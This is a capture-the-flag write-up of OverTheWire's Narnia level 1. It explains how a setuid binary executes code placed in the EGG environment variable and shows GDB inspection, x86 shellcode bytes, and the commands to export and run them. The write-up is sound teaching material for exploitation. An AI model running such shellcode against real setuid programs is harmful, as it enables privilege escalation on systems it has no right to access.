# Narnia1

Second level of Narnia's Wargame from https://overthewire.org

---

## Goal

Execute code using the `EGG` environment variable and obtain the credentials for the next level.

Passwords for each level are stored in:

```
/etc/narnia_pass/narnia$
```

where `$` corresponds to the level number.

---

# Initial Analysis

The binary is located in:

```bash
/narnia/narnia1
```

Checking permissions:

```bash
ls -l narnia1
```

Output:

```
-r-sr-x--- 1 narnia2 narnia1 ... narnia1
```

The binary has the **setuid bit enabled**, meaning it should execute with the effective privileges of `narnia2`.

---

# Source Code

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");

    ret = (int (*)())getenv("EGG");
    ret();

    return 0;
}
```

---

# Vulnerability Analysis

The program stores the address returned by:

```c
getenv("EGG")
```

inside a function pointer:

```c
int (*ret)();
```

Then executes it:

```c
ret();
```

This means any data placed inside the `EGG` environment variable will be interpreted as executable code.

The execution flow is:

```
EGG environment variable
        |
        v
getenv()
        |
        v
function pointer
        |
        v
execute attacker-controlled bytes
```

---

# Debugging With GDB

Set a breakpoint before the indirect call:

```gdb
break *main+75
```

The relevant assembly:

```asm
mov    -0x4(%ebp),%eax
call   *%eax
```

`eax` contains the address returned by `getenv("EGG")`.

Example:

```gdb
info registers eax
```

Output:

```
eax 0xffffdded
```

Inspecting memory:

```gdb
x/30bx $eax
```

shows the shellcode stored inside the environment variable.

The instruction pointer successfully jumps into the injected code:

```gdb
si
```

Result:

```
0xffffdded in ?? ()
```

The shellcode is now executing.

---

# Shellcode Execution

The intended solution uses shellcode stored in `EGG`.

Example shellcode:

```
\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80
```

Exporting it:

```bash
export EGG=$(python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"')
```

Running:

```bash
./narnia1
```

executes the payload.

---

# Expected Behavior

The original challenge environment expects the shellcode to execute:

```
/bin/cat /etc/narnia_pass/narnia2
```

using the setuid privileges of the binary.

Expected result:

```text
narnia2 password is displayed
```

---

# Environment Difference

In the current environment, the shellcode executes successfully, but the resulting process does not appear to retain the expected `narnia2` privileges.

Verification:

```bash
whoami
```

returns:

```
narnia1
```

instead of:

```
narnia2
```

The exploit mechanism works, but the privilege escalation behavior differs from the original writeups.

Possible causes:

- Changed challenge environment
- Different kernel/container behavior
- Setuid restrictions
- Updated OverTheWire infrastructure

---

# Key Concepts Learned

- Environment variable injection
- Function pointer execution
- Indirect calls in assembly
- Shellcode execution
- Linux syscalls
- Debugging injected code with GDB
- Understanding setuid behavior

---

# Takeaways

Narnia1 demonstrates a direct code execution vulnerability:

```
User-controlled environment variable
            |
            v
Function pointer overwrite/control
            |
            v
Arbitrary code execution
```

The main lesson is understanding how user-controlled data can become executable code and how programs transition from normal execution into attacker-controlled instructions.
